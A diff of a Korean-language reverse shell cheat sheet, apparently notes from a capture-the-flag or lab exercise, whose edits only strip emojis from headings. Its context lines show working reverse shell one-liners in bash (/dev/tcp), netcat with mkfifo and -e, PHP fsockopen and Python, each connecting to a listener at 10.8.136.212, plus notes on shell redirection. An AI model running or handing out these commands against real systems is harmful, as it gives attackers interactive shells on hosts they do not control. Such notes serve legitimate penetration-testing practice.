@@ -1,6 +1,6 @@
 # reverse shell examples
 
-## 💻 리버스 셸 명령어 정리 (Reverse Shell Commands)
+## 리버스 셸 명령어 정리 (Reverse Shell Commands)
 
 > 사용법: `10.8.136.212`=tun0 IP, `1234`=리스너 포트로 통째로 치환
 
@@ -33,7 +33,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 4444 >/tm
 
 ### \# step 3 find flag
 
-#### 🖥️ Bash
+#### Bash
 
 ```sh
 # 기본 (10.8.136.212=LHOST, 443=LPORT)
@@ -49,7 +49,7 @@ exec 5<>/dev/tcp/10.8.136.212/443; cat <&5 | while read line; do $line 2>&5 >&5;
 bash -i 5<> /dev/tcp/10.8.136.212/443 0<&5 1>&5 2>&5
 ```
 
-#### 🐘 PHP
+#### PHP
 
 ```php
 # 방화벽 우회 (10.8.136.212=LHOST, 1234=LPORT)
@@ -61,7 +61,7 @@ php -r '$sock=fsockopen("10.8.136.212",1234);exec("/bin/bash <&3 >&3 2>&3");'
 # 설명: exec와 유사하며, 각각 출력 방식만 다른 시스템 명령어 실행 함수입니다.
 ```
 
-#### 🐍 Python
+#### Python
 
 ```python
 # 단계별 (LHOST/LPORT만 수정)
@@ -92,7 +92,7 @@ subprocess.call(["/bin/bash","-i"])
 '
 ```
 
-#### 🧩 기타
+#### 기타
 
 ```sh
 # Telnet (10.8.136.212=LHOST, 443=LPORT)
@@ -108,7 +108,7 @@ busybox nc 10.8.136.212 443 -e sh
 
 -----
 
-## 🔃 리디렉션 정리
+## 리디렉션 정리
 
 ````text
 - `>` : 표준 출력(Standard Output, stdout) 리디렉션
@@ -131,7 +131,7 @@ busybox nc 10.8.136.212 443 -e sh
 
 언어/명령,명령어 (COMMAND)
 
-### 📢 환경별 주요 명령어 (코드 블록)
+### 환경별 주요 명령어 (코드 블록)
 
 # 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비
 
